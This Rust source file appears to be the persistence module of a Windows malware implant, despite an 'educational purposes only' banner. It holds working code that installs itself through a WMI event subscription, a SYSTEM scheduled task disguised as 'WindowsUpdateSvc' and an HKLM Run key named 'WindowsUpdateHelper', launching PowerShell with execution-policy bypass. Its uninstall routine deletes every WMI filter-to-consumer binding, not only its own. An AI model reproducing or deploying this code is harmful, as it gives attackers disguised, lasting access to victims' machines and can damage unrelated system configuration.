/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// persistence.rs — WMI / Scheduled Task / Registry persistence.
//
// install() tries three methods in order and returns on first success.
// All three shell out to powershell.exe or cmd.exe (noisy).
//
// BROKEN / SHARP:
//   - HKLM Run and SYSTEM schtask need elevation; WMI subscription too.
//   - uninstall() Remove-WmiObject on ALL __FilterToConsumerBinding objects
//     in the namespace, not just VUpdate — can delete unrelated bindings.
//   - No COM API; child processes are the detection surface.

use log::{info, error};
use std::process::Command;

/// Try WMI, then scheduled task, then HKLM Run. True if any succeeded.
pub fn install() -> bool {
    info!("Installing persistence…");
    install_wmi() || install_scheduled_task() || install_registry()
}

/// Path of the running PE, or None if current_exe fails.
fn exe_path() -> Option<String> {
    std::env::current_exe().ok().map(|p| p.display().to_string())
}

/// WMI event filter `VUpdate`: fire when SystemUpTime >= 120s, consume by
/// launching this EXE. Uses root\subscription CommandLineEventConsumer.
fn install_wmi() -> bool {
    let path = match exe_path() { Some(p) => p, None => return false };
    let query = r#"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System" AND TargetInstance.SystemUpTime >= 120"#;
    let ps = format!(
        r#"
$f = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{ Name='VUpdate'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='{q}' }}
$c = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{ Name='VUpdateConsumer'; CommandLineTemplate='{e}' }}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{ Filter=$f; Consumer=$c }}
"#,
        q = query, e = path
    );
    Command::new("powershell")
        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &ps])
        .output()
        .map(|o| { if o.status.success() { info!("WMI persistence installed."); true } else { false } })
        .unwrap_or(false)
}

/// schtasks /create /tn WindowsUpdateSvc /sc onlogon /ru SYSTEM.
fn install_scheduled_task() -> bool {
    let path = match exe_path() { Some(p) => p, None => return false };
    let cmd = format!(r#"schtasks /create /tn "WindowsUpdateSvc" /tr "{}" /sc onlogon /ru SYSTEM /f"#, path);
    Command::new("cmd")
        .args(&["/C", &cmd])
        .output()
        .map(|o| { if o.status.success() { info!("Scheduled task persistence installed."); true } else { false } })
        .unwrap_or(false)
}

/// HKLM\...\Run WindowsUpdateHelper = path to this EXE.
fn install_registry() -> bool {
    let path = match exe_path() { Some(p) => p, None => return false };
    let cmd = format!(
        r#"reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /t REG_SZ /d "{}" /f"#,
        path
    );
    Command::new("cmd")
        .args(&["/C", &cmd])
        .output()
        .map(|o| { if o.status.success() { info!("Registry persistence installed."); true } else { false } })
        .unwrap_or(false)
}

/// Remove WMI VUpdate objects, the scheduled task, and the Run value.
/// Always returns true even if individual deletes fail.
/// BROKEN: FilterToConsumerBinding removal is unfiltered.
pub fn uninstall() -> bool {
    info!("Removing persistence…");
    let ps = r#"
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'VUpdate' } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'VUpdateConsumer' } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
"#;
    let _ = Command::new("powershell").args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps]).output();
    let _ = Command::new("cmd").args(&["/C", r#"schtasks /delete /tn "WindowsUpdateSvc" /f"#]).output();
    let _ = Command::new("cmd").args(&["/C",
        r#"reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /f"#]).output();
    true
}
